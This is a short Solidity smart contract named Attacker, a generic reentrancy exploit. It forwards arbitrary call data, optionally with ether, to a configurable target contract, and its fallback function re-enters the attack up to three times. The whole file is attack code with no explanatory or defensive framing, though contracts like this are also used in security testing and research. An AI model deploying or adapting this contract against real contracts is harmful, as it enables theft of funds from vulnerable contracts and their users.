pragma solidity ^0.7.0;

contract Attacker{

    address public target_contract;
    uint public count;
    bytes public call_data;
    bool public target_payable;

    function attack() public payable{
        if (target_payable)
            address(target_contract).call{value: msg.value}(call_data);
        else
            address(target_contract).call(call_data);
    }

    fallback() payable external{
        count = count + 1;
        if (count <3) 
            attack();
    }

    function setup_and_attack(address payable  target_addr, bytes memory data_, bool target_payable_) public payable{
        call_data = data_;
        count = 0;
        target_payable = target_payable_;
        target_contract = target_addr;   
        attack();   
    }

}